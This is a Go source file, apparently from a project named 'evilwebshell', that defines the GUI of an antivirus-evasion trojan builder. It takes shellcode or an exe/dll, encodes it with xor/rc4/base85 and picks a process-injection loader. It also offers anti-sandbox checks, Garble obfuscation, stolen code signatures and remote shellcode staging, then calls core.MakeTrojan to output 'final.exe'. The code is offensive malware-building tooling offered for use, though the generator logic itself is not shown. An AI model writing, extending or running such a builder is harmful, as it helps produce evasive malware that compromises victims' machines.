package themes

import (
	"evilwebshell/core"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
	"log"
	"math/rand"
	"os"
	"reflect"
	"strings"
	"time"
)

var (
	infProgress *widget.ProgressBarInfinite

	AntiSandboxOpt = core.AntiSandboxOption{
		TimeStart:      false,
		RamCheck:       false,
		CpuNumberCheck: false,
		WechatCheck:    false,
		DiskSizeCheck:  false,
		Bypassweibu:    false,
	}
	BuildOpt = core.BuildOption{
		Garble:     false,
		Upx:        false,
		LiteralObf: false,
		SeedRandom: false,
		Fake:       false,
	}
	TempOpt = core.Option{
		Keyname:           "",
		Shellname:         "",
		Suiji:             "",
		Module:            "",
		SrcFile:           "payload.bin",
		DstFile:           "final.exe",
		ShellcodeEncode:   "",
		Donut:             false,
		Separate:          "",
		SignFileLoc:       "",
		ShellcodeLocation: "code.txt",
		AntiSandboxOpt:    AntiSandboxOpt,
		BuildOpt:          BuildOpt,
	}
)

func getRandstring(length int) string {
	if length < 1 {
		return ""
	}
	char := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	charArr := strings.Split(char, "")
	charlen := len(charArr)
	ran := rand.New(rand.NewSource(time.Now().Unix()))

	var rchar string = ""
	for i := 1; i <= length; i++ {
		rchar = rchar + charArr[ran.Intn(charlen)]
	}
	return rchar
}

func BypassAV(win fyne.Window) fyne.CanvasObject {
	var fileSrcName string
	//反射读取laoder
	keys := reflect.ValueOf(core.Modules).MapKeys()
	loaderTmp := make([]string, 0)
	for _, lt := range keys {
		loaderTmp = append(loaderTmp, lt.String())
	}

	//loader
	selectLoaderEntry := widget.NewSelect(loaderTmp, func(s string) {
		TempOpt.Module = s
	})
	selectLoaderEntry.PlaceHolder = "Loader type"

	BypassFileEntry := widget.NewEntry()
	BypassFileEntry.SetText("payload.bin")
	BypassFileButton := widget.NewButton("File", func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, win)
				return
			}
			if reader == nil {
				log.Println("Cancelled")
				return
			}
			//fileSrcName = reader.URI().Path()
			fileSrcName = reader.URI().Path()
			ext := reader.URI().Extension()
			println(ext)
			if ext != ".txt" && ext != ".bin" && ext != ".exe" && ext != ".dll" {
				dialog.ShowInformation("Error!", "请选择exe、dll、bin、txt格式的文件！", win)
				return
			}
			if ext == ".exe" || ext == ".dll" {
				TempOpt.Donut = true
				selectLoaderEntry.Options = []string{"NtQueueApcThreadEx", "CreateFiber", "EtwpCreateEtwThread", "HeapAlloc"}
			}
			BypassFileEntry.SetText(fileSrcName)
			println(TempOpt.Donut)
		}, win)
		//设置默认位置为当前路径
		pwd, _ := os.Getwd()
		nowFileURI := storage.NewFileURI(pwd)
		listerURI, _ := storage.ListerForURI(nowFileURI)
		fd.SetLocation(listerURI)
		fd.Resize(fyne.NewSize(600, 480))
		//fd.SetFilter(storage.NewExtensionFileFilter([]string{".bin", ".txt", ".exe", ".dll"}))
		fd.Show()
	})
	infProgress = widget.NewProgressBarInfinite()
	infProgress.Stop()
	middle := widget.NewLabel("Final Trojan Name")
	TrojanNameEntry := widget.NewEntry()
	TrojanNameEntry.SetPlaceHolder("final.exe")
	TrojanNameEntry.SetText("final.exe")
	SelectFileV := container.NewBorder(nil, nil, BypassFileButton, nil, BypassFileEntry)
	TrojanFileV := container.NewBorder(nil, nil, middle, nil, TrojanNameEntry)

	shellcodeProcess := widget.NewSelect([]string{"2xor+rc4+hex+base85", "xor+rc4+hex+base85", "rc4+hex+base85"}, func(s string) {
		TempOpt.ShellcodeEncode = s
	})
	shellcodeProcess.PlaceHolder = "Shellcode way"

	//sandbox
	sandboxType := make([]string, 0)
	sandboxList := reflect.TypeOf(AntiSandboxOpt)
	sandboxListNum := sandboxList.NumField()
	for i := 0; i < sandboxListNum; i++ {
		sandboxType = append(sandboxType, sandboxList.Field(i).Name)
	}

	fmt.Printf("%v", sandboxType)
	BypassSandboxNumEntry := widget.NewEntry()
	BypassSandboxNumEntry.SetPlaceHolder("Sandbox ways")

	//建立反沙箱选项的标签
	sandboxLabel := widget.NewLabel("anti  Sandbox:")
	//挨个建立check建立反沙箱选项

	sandboxCheck1 := widget.NewCheck(sandboxType[0], func(b bool) {
		TempOpt.AntiSandboxOpt.TimeStart = b
	})
	sandboxCheck2 := widget.NewCheck(sandboxType[1], func(b bool) {
		TempOpt.AntiSandboxOpt.RamCheck = b
	})
	sandboxCheck3 := widget.NewCheck(sandboxType[2], func(b bool) {
		TempOpt.AntiSandboxOpt.CpuNumberCheck = b
	})
	sandboxCheck4 := widget.NewCheck(sandboxType[3], func(b bool) {
		TempOpt.AntiSandboxOpt.WechatCheck = b
	})
	sandboxCheck5 := widget.NewCheck(sandboxType[4], func(b bool) {
		TempOpt.AntiSandboxOpt.DiskSizeCheck = b
	})
	sandboxCheck6 := widget.NewCheck(sandboxType[5], func(b bool) {
		TempOpt.AntiSandboxOpt.Bypassweibu = b
	})
	sandboxSelectAll := widget.NewCheck("select all", func(b bool) {
		sandboxCheck1.SetChecked(b)
		sandboxCheck2.SetChecked(b)
		sandboxCheck3.SetChecked(b)
		sandboxCheck4.SetChecked(b)
		sandboxCheck5.SetChecked(b)
		sandboxCheck6.SetChecked(b)
	})
	sandboxV := container.NewGridWithColumns(6, sandboxSelectAll, sandboxCheck1, sandboxCheck2, sandboxCheck3, sandboxCheck4, sandboxCheck5, sandboxCheck6)

	//构建编译选项说明
	buildLabel := widget.NewLabel("build option:")
	//buildLabel.Hide()

	// 构建 build opt 多选框
	buildCheck1 := widget.NewCheck("Fake", func(b bool) {
		TempOpt.BuildOpt.Fake = b
	})
	buildCheck2 := widget.NewCheck("Hide", func(b bool) {
		TempOpt.BuildOpt.Hide = b
	})
	buildCheck3 := widget.NewCheck("LiteralObf", func(b bool) {
		TempOpt.BuildOpt.LiteralObf = b
	})
	buildCheck4 := widget.NewCheck("randomseed", func(b bool) {
		TempOpt.BuildOpt.SeedRandom = b
	})
	buildCheck3.Hide()
	buildCheck4.Hide()

	shellcodeProcess.PlaceHolder = "Shellcode way"

	checkGarble := widget.NewCheck("Garble", func(on bool) {
		TempOpt.BuildOpt.Garble = on
		if on {
			buildCheck3.Show()
			buildCheck4.Show()
		} else {
			buildCheck3.Hide()
			buildCheck4.Hide()
		}

	})

	BypassSelectV := container.NewBorder(nil, nil, nil, nil, container.NewGridWithColumns(2, shellcodeProcess, selectLoaderEntry))
	//checkSgn.MinSize()

	buildBoxV := container.NewGridWithColumns(5, checkGarble, buildCheck1, buildCheck2, buildCheck3, buildCheck4)
	//分离免杀UI设计
	separateLocationText := widget.NewEntry()
	separateUrlText := widget.NewEntry()

	separateLocationText.SetPlaceHolder("separate shellcode file")
	separateUrlText.SetPlaceHolder("remote shellcode url")

	separateLocationText.SetText("code.txt")
	separateUrlText.SetText("")

	separateLocationLabel := widget.NewLabel("separate shellcode file")
	separateUrlLabel := widget.NewLabel("remote shellcode url")

	separateLocation := container.NewBorder(nil, nil, separateLocationLabel, nil, separateLocationText)
	separateUrl := container.NewBorder(nil, nil, separateUrlLabel, nil, separateUrlText)

	separateLocation.Hide()
	separateUrl.Hide()
	separateradio := widget.NewRadioGroup([]string{"separate shellcode", "remote shellcode"}, func(s string) {
		//println(s)
		TempOpt.Separate = s
		switch s {
		case "separate shellcode":
			separateLocation.Show()
			separateUrl.Hide()
		case "remote shellcode":
			separateLocation.Hide()
			separateUrl.Show()
		case "":
			separateLocation.Hide()
			separateUrl.Hide()
		}
	})
	separateradio.Horizontal = true

	//sigthief按钮
	SignFileEntry := widget.NewEntry()
	SignFilelbutton := widget.NewButton("File", func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, win)
				return
			}
			if reader == nil {
				log.Println("Cancelled")
				return
			}
			sigexe := reader.URI().Path()
			println(sigexe)
			SignFileEntry.SetText(sigexe)
			TempOpt.SignFileLoc = sigexe
		}, win)
		pwd, _ := os.Getwd()
		nowFileURI := storage.NewFileURI(pwd)
		listerURI, _ := storage.ListerForURI(nowFileURI)
		fd.SetLocation(listerURI)
		fd.Resize(fyne.NewSize(600, 480))
		//fd.SetFilter(storage.NewExtensionFileFilter([]string{".bin", ".txt", ".exe", ".dll"}))
		fd.Show()
	})
	SignFileRow := container.NewBorder(nil, nil, SignFilelbutton, nil, SignFileEntry)
	SignFileRow.Hide()
	SignCheck := widget.NewCheck("SignFile", func(b bool) {
		switch b {
		case true:
			SignFileRow.Show()
		case false:
			SignFileRow.Hide()
		}
	})

	//增强功能UI设计
	//advancedchecklabel := widget.NewLabel("增 强 功 能 ：")
	//advancedcheck1 := widget.NewCheck("末尾添加垃圾数据过WD", func(b bool) {
	//	TempOpt.Advancedopt.Addextradata = b
	//})
	//advancedcheck2 := widget.NewCheck("unhook", func(b bool) {
	//	TempOpt.Advancedopt.Unhook = b
	//})
	//advancedcheck3 := widget.NewCheck("gate", func(b bool) {
	//	TempOpt.Advancedopt.Gate = b
	//})
	//advancedgroup := container.NewGridWithColumns(3, advancedcheck1, advancedcheck2, advancedcheck3)

	//生成按钮设计
	BypassStartButton := widget.NewButton("<<<<<<< Create >>>>>>>", func() {
		if TempOpt.Module == "" || TempOpt.ShellcodeEncode == "" {
			dialog.ShowInformation("Error！", "select shellcode encoding method and loader method", win)
			return
		}
		infProgress.Start()
		TempOpt.SrcFile = BypassFileEntry.Text
		TempOpt.DstFile = TrojanNameEntry.Text
		TempOpt.ShellcodeLocation = separateLocationText.Text
		TempOpt.ShellcodeUrl = separateUrlText.Text
		TempOpt.Keyname = getRandstring(4)
		TempOpt.Shellname = getRandstring(8)
		TempOpt.Xor = getRandstring(5)
		TempOpt.Rc4 = getRandstring(6)
		TempOpt.Canshu = getRandstring(3)
		TempOpt.Suiji = getRandstring(7)

		StartWay()
		infProgress.Stop()
		dialog.ShowInformation("success!", "this file is:"+TrojanNameEntry.Text, win)
	})
	return container.NewVBox(
		SelectFileV,
		TrojanFileV,
		BypassSelectV,
		separateradio,
		separateLocation,
		separateUrl,
		SignCheck,
		SignFileRow,
		//BypassSelectV2,
		sandboxLabel,
		sandboxV,
		buildLabel,
		buildBoxV,
		//advancedcheckLabel,
		//advancedgroup,
		BypassStartButton,
		infProgress)
}

func StartWay() {
	core.MakeTrojan(TempOpt)
}
